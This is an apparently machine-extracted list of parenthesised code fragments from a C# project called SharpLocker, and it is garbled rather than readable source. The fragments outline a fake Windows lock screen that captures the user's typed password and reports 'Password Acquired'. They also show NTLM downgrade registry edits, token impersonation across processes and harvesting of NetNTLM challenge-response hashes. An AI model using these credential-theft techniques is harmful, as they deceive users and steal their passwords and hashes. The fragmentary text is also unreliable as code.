@@ -1,0 +1,449 @@
+"(!ValidateSID(SID, verbose"
+"("""""
+"(""-"", """""
+"(""1.0.*"""
+"(""1.0.0.0"""
+"(""Account"", ""Domain"", ""Password"""
+"(""Exiting.."""
+"(""Matt"", ""BANKABC"", plainpassword"
+"(""Microsoft Sans Serif"", 20.25F"
+"(""Microsoft.Performance"", ""CA1811:AvoidUncalledPrivateCode"""
+"(""Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"", ""16.0.0.0"""
+"(""Not elevated. Performing attack with current NTLM settings on current user\n"""
+"(""Object has already been disposed!!!"""
+"(""Original Hash: "" + utils.ByteArrayToString(netNtlmv2ResponseOriginal"
+"(""Performing NTLM Downgrade\n"""
+"(""Performing attack on current user only (no impersonation"
+"(""Response Hash: "" + utils.ByteArrayToString(ntlmv2ResponseHash"
+"(""Restoring NTLM values\n"""
+"(""Running elevated\n"""
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa"", ""LMCompatibilityLevel"", 2"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa"", ""LMCompatibilityLevel"", oldValue_LMCompatibilityLevel"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa"", ""LMCompatibilityLevel"", out oldValue_LMCompatibilityLevel"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"", ""NtlmMinClientSec"", 536870912"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"", ""NtlmMinClientSec"", oldValue_NtlmMinClientSec"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"", ""NtlmMinClientSec"", out oldValue_NtlmMinClientSec"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"", ""RestrictSendingNTLMTraffic"", 0"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"", ""RestrictSendingNTLMTraffic"", oldValue_RestrictSendingNTLMTraffic"
+"(""SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"", ""RestrictSendingNTLMTraffic"", out oldValue_RestrictSendingNTLMTraffic"
+"(""Segoe UI"", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte"
+"(""Segoe UI"", 33F"
+"(""SharpLocker"""
+"(""SharpLocker.Properties.Resources"", typeof(Resources"
+"(""Shell_TrayWnd"", """""
+"(""Starting impersonation\n"""
+"(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""16.0.0.0"""
+"(""Untitled-1"", resourceCulture"
+"(""[x] Collecting information..."""
+"(""[x] Incorrect password input by user"""
+"(""[x] Success: Password Acquired"""
+"(""\n"", String.Empty"
+"(""a6f8500f-68bc-4efc-962a-6c6e68d893af"""
+"(""advapi32"", CharSet = CharSet.Auto, SetLastError = true"
+"(""advapi32.dll"", SetLastError = true"
+"(""arrow"", resourceCulture"
+"(""button"", resourceCulture"
+"(""button1"", resourceCulture"
+"(""button2"", resourceCulture"
+"(""kernel32.dll"""
+"(""kernel32.dll"", SetLastError = true"
+"(""secur32.dll"", CharSet = CharSet.Auto"
+"(""secur32.dll"", CharSet = CharSet.Auto, SetLastError = true"
+"(""secur32.dll"", SetLastError = true"
+"(""thumb_14400082930User"", resourceCulture"
+"(""user32.dll"""
+"(""usericon"", resourceCulture"
+"(""{0:x2}"", b"
+"(""{0}::{1}:{2}:{3}:{4}"", UserName, Domain, Challenge, Resp1, Resp2"
+"(""{0}::{1}:{2}:{3}:{4}"", UserName, Domain, Resp1, Resp2, Challenge"
+"(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"""
+"(' ', width"
+"(0, 0"
+"(0, 32"
+"(0, width - 3"
+"(0x0040, true, new IntPtr(thread.Id"
+"(199, 199"
+"(244, 324"
+"(246, 217"
+"(345, 31"
+"(364, 38"
+"(403, 0"
+"(403, 60"
+"(412, 277"
+"(45, 38"
+"(597, 324"
+"(6F, 13F"
+"(71, 25"
+"(800, 450"
+"(@""C:\Windows\Web\Wallpaper\Windows\img0.jpg"""
+"(A, B, C, D, X[0], 3"
+"(A, B, C, D, X[12], 3"
+"(A, B, C, D, X[1], 3"
+"(A, B, C, D, X[2], 3"
+"(A, B, C, D, X[3], 3"
+"(A, B, C, D, X[4], 3"
+"(A, B, C, D, X[8], 3"
+"(B, C, D, A, X[11], 19"
+"(B, C, D, A, X[12], 13"
+"(B, C, D, A, X[12], 15"
+"(B, C, D, A, X[13], 13"
+"(B, C, D, A, X[13], 15"
+"(B, C, D, A, X[14], 13"
+"(B, C, D, A, X[14], 15"
+"(B, C, D, A, X[15], 13"
+"(B, C, D, A, X[15], 15"
+"(B, C, D, A, X[15], 19"
+"(B, C, D, A, X[3], 19"
+"(B, C, D, A, X[7], 19"
+"(C, D, A, B, X[10], 11"
+"(C, D, A, B, X[10], 9"
+"(C, D, A, B, X[11], 9"
+"(C, D, A, B, X[14], 11"
+"(C, D, A, B, X[2], 11"
+"(C, D, A, B, X[4], 11"
+"(C, D, A, B, X[5], 11"
+"(C, D, A, B, X[6], 11"
+"(C, D, A, B, X[7], 11"
+"(C, D, A, B, X[8], 9"
+"(C, D, A, B, X[9], 9"
+"(D, A, B, C, X[10], 9"
+"(D, A, B, C, X[11], 9"
+"(D, A, B, C, X[13], 7"
+"(D, A, B, C, X[1], 7"
+"(D, A, B, C, X[4], 5"
+"(D, A, B, C, X[5], 5"
+"(D, A, B, C, X[5], 7"
+"(D, A, B, C, X[6], 5"
+"(D, A, B, C, X[7], 5"
+"(D, A, B, C, X[8], 9"
+"(D, A, B, C, X[9], 7"
+"(D, A, B, C, X[9], 9"
+"(Handle, SW_HIDE"
+"(Handle, SW_SHOW"
+"(HandleOfStartButton, SW_HIDE"
+"(HandleOfStartButton, SW_SHOW"
+"(IntPtr pSID, out IntPtr ptrSid"
+"(OpenProcessToken(process.Handle, 0x0002, ref token"
+"(OpenProcessToken(process.Handle, 0x0008, ref token"
+"(OpenThreadToken(handle, 0x0002, true, ref token"
+"(OpenThreadToken(handle, 0x0008, true, ref token"
+"(Process process, string challenge, bool verbose"
+"(ProcessThread thread, string challenge, bool verbose"
+"(SID == ""S-1-5-18"" || SID == ""S-1-5-19"" || SID == ""S-1-5-20"" || SID == ""S-1-5-96-0-0"" || SID == ""S-1-5-96-0-1"" || SID == ""S-1-5-90-0-1"""
+"(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height"
+"(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy"
+"(ThisSecBuffer, pBuffers, false"
+"(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer"
+"(TokenInformation, typeof(TOKEN_USER"
+"(TokenUser.User.Sid, out pstr"
+"(UnmanagedType.ByValArray, SizeConst = 1"
+"(b, 0, b.Length"
+"(b, b.Length"
+"(blob, 0, targetInfomration, server_challenege.Length, blob.Length"
+"(bool impersonate = true, bool threads = false, bool downgrade = true, bool restore = true, string challenge = ""1122334455667788"", bool verbose = false"
+"(byte[] a, int len"
+"(byte[] input, int offset, int len"
+"(byte[] message, string challenge"
+"(byte[] secBufferBytes, int bufferType"
+"(challenge, false"
+"(challenge, true"
+"(challengeBytes, 0, serverMessage, 24, 8"
+"(column, width"
+"(e, e.Length"
+"(handleOfDesktop, 0, ""button"", 0"
+"(hex.Substring(i, 2"
+"(hs == ""00"""
+"(hs, 16"
+"(i, 2"
+"(impersonate, threads, downgrade, restore, challenge, verbose"
+"(input, offset + i, buffer, bufferNdx, len - i"
+"(input, offset + i, buffer, bufferNdx, partLen"
+"(int Index = 0, BufferIndex = 0; Index < cBuffers; Index++"
+"(int hwnd, int command"
+"(int parentHandle, int childAfter, string className, int windowTitle"
+"(key, true"
+"(message, 12"
+"(message, 16"
+"(message, 20"
+"(message, 24"
+"(message, 28"
+"(message, 32"
+"(message, 36"
+"(message, 40"
+"(message, domain_off, domain, 0, domain_len"
+"(message, lm_resp_off, lm_resp, 0, lm_resp_len"
+"(message, nt_resp_off, nt_resp, 0, nt_resp_len"
+"(message, user_off, user, 0, user_len"
+"(mostLeft, mostTop"
+"(name, value"
+"(new byte[16], 0, serverMessage, 32, 16"
+"(new string('-', tableWidth"
+"(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic"
+"(object sender, EventArgs e"
+"(object.ReferenceEquals(resourceMan, null"
+"(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic"
+"(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic"
+"(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic"
+"(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int"
+"(pBuffers, CurrentOffset"
+"(pBuffers, typeof(SecBuffer"
+"(process, challenge, verbose"
+"(ref buffer, 0"
+"(ref byte[] block, int offset"
+"(ref input, offset + i"
+"(result, challenge"
+"(screen.Bounds.Width, screen.Bounds.Height"
+"(secBufferBytes, 0, pvBuffer, cbBuffer"
+"(separators, 5, StringSplitOptions.RemoveEmptyEntries"
+"(server_challenege, 0, targetInfomration, 0, server_challenege.Length"
+"(string SID, bool verbose"
+"(string challenge, bool DisableESS"
+"(string className, string windowText"
+"(string key, string name, object value"
+"(string key, string name, out object result"
+"(string target, string user, string password"
+"(string target, string user, string password, byte[] server_challenege, byte[] blob"
+"(string text, int width"
+"(string.Format(""Got blank response for user {0}\n"", WindowsIdentity.GetCurrent("
+"(string.Format(""Impersonated user {0}\n"", WindowsIdentity.GetCurrent("
+"(string.Format(""{0} {1}\n"", SID, process.ProcessName"
+"(string.Format(""{0}\n"", response.Output("
+"(string.Format(""{0}\n"", response.ToString("
+"(string.Format(""{0}\n"", result"
+"(string.Format(""{0}\n"", result.ToString("
+"(tail, 0, tail.Length"
+"(target, user, password"
+"(target, username, password, serverChallenge, blob"
+"(thread, challenge, verbose"
+"(token, 1, TokenInformation, TokenInfLength, out TokenInfLength"
+"(uint a, uint b, uint c, uint d, uint x, int s"
+(!result.Resp1.IsNullOrWhiteSpace(
+(!threads
+('$(MSBuildExtensionsPath
+((
+(((uint
+((GetHexVal(hex[i << 1]
+((Settings
+((System.ComponentModel.ISupportInitialize
+((System.Drawing.Bitmap
+((b & (c | d
+((b & c
+((count * 8
+((len - 2
+((uint
+()
+() + target.ToUpper(
+().User.ToString(
+(0
+(120 - bufferNdx
+(32
+(32 - s
+(56 - bufferNdx
+(8 * i
+(?(q((
+(Buffer
+(ByteArrayToString(domain
+(ByteArrayToString(user
+(C
+(CancelEventArgs e
+(Configuration
+(Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height
+(Default
+(DisableESS
+(Exception
+(Exception ex
+(ExtensibilityGlobals
+(Form form = new Form(
+(FromElevated
+(GetHexVal(hex[(i << 1
+(IntPtr hMem
+(IntPtr token
+(InternalMonologueResponse response
+(LayoutKind.Sequential
+(List<InternalMonologueResponse> responses
+(Lsa != null
+(MAX_TOKEN_SIZE
+(MD4 md
+(MSBuildExtensionsPath
+(MSBuildToolsPath
+(MSBuildToolsVersion
+(Marshal.SizeOf(ThisSecBuffer
+(MonoDevelop/Xamarin Studio
+(PTVS
+(Platform
+(Process process in Process.GetProcesses(
+(ProcessThread thread in process.Threads
+(ProjectConfigurationPlatforms
+(Result
+(SID
+(SID.IsNullOrWhiteSpace(
+(Screen screen
+(SecBuffer
+(SecBufferpvBuffer
+(Server
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(String hex
+(String hexString
+(TOKEN_USER
+(ThisSecBuffer.cbBuffer > 0
+(TokenInfLength
+(TokenInformation
+(Windows
+(WindowsBuiltInRole.Administrator
+(WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken
+(Xamarin productivity tool
+(a
+(array of 4 uints
+(authenticatedUsers.Contains(SID
+(b
+(b ^ c ^ d
+(ba
+(ba.Length * 2
+(bool disposing
+(bufferNdx < 56
+(bufferSize
+(buffering
+(byte
+(byte b
+(byte b in ba
+(byte[]
+(byte[] b
+(byte[] ba
+(byte[] secBufferBytes
+(c
+(c & d
+(cBuffers == 1
+(cbBuffer
+(challenge
+(char hex
+(checker.checkPassword(plainpassword
+(console.Output(
+(contains which files were open etc.
+(context[i] >> (8 * j
+(count % BLOCK_LENGTH
+(decval
+(default installation on Windows 7
+(disposing
+(disposing && (components != null
+(downgrade == true
+(downgrade == true && restore == true
+(dupToken
+(e
+(false
+(global::System.ComponentModel.EditorBrowsableState.Advanced
+(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings(
+(handle == IntPtr.Zero
+(hex.Length % 2 == 1
+(https://github.com/Pickfordmatt/SharpLocker/blob/master/sharplocker.png?raw=true
+(https://github.com/github/gitignore/pull/1529#issuecomment-104372622
+(https://github.com/github/gitignore/pull/2483#issue-259490424
+(https://github.com/opdsealey/NetNTLMv2PasswordChecker
+(i < len
+(i = partLen; i + BLOCK_LENGTH - 1 < len; i += BLOCK_LENGTH
+(i == BLOCK_LENGTH - 1
+(impersonate == true
+(informational
+(ing
+(int
+(int Index = 0; Index < cBuffers; Index++
+(int bufferSize
+(int i = 0; i < 16; i++
+(int i = 0; i < 4; i++
+(int i = 0; i < 8; i++
+(int i = 0; i < BLOCK_LENGTH; i++
+(int i = 0; i < NumberChars; i += 2
+(int i = 0; i < hex.Length >> 1; ++i
+(int i = 0; i < hexString.Length; i += 2
+(int i = 0; i < temp.Length; i++
+(int j = 0; j < 4; j++
+(interim result
+(isElevated
+(key
+(len >= partLen
+(lm_resp
+(mostLeft.ToString(
+(name
+(netNTLMv2 Response
+(netNTLMv2Response
+(netNtlmv2ResponseOriginal
+(new LockScreenForm(
+(new WindowsPrincipal(WindowsIdentity.GetCurrent(
+(norbert.hranitzky@mchp.siemens.de
+(nt_resp
+(nt_resp_len == 24
+(nt_resp_len > 24
+(ntlmHash
+(ntlmv2Hash
+(obj
+(offset < 0 || len < 0 || (long
+(osn@po.cwru.edu
+(pBuffers
+(pBuffers != IntPtr.Zero
+(pBuffers == IntPtr.Zero
+(params string[] columns
+(password
+(plainpassword
+(pstr
+(pvBuffer
+(pvBuffer != IntPtr.Zero
+(resCode != 0 && DisableESS
+(response
+(response != null
+(response == null
+(response.Resp1.IsNullOrWhiteSpace(
+(response.Responses
+(result
+(row
+(s
+(s.IsNullOrWhiteSpace(
+(sa
+(sass
+(screen
+(screen.Primary == false
+(secBufferBytes
+(serverMessage
+(serverMessage[22] & 0xF7
+(string column in columns
+(string hex
+(string netNTLMv2Response
+(string password
+(string plainpassword
+(string s
+(string.IsNullOrEmpty(text
+(strlist[2]
+(strlist[3]
+(strlist[4]
+(tableWidth - columns.Length
+(targetInfomration
+(temp[i]
+(temp[i] != '-'
+(this
+(this string value
+(this.LockScreenForm_Load
+(this.LockedLabel
+(this.PasswordTextBox
+(this.PasswordTextBox_TextChanged
+(this.ProfileIcon
+(this.SubmitPasswordButton
+(this.SubmitPasswordButton_Click
+(this.UserNameLabel
+(token
+(typeof(SecBuffer
+(typeof(int
+(uint[]
+(unicode.GetBytes(password
+(unicode.GetBytes(targetInfomration
+(val < 58 ? 48 : 55
+(value != null
+(value == null
+(value.Trim(
+(var response in responses
+(var screen in Screen.AllScreens
+(verbose
+(verbose == true
+(welcome
+(width
+(width - (width - text.Length
+(with potential passwords
+(~b & d
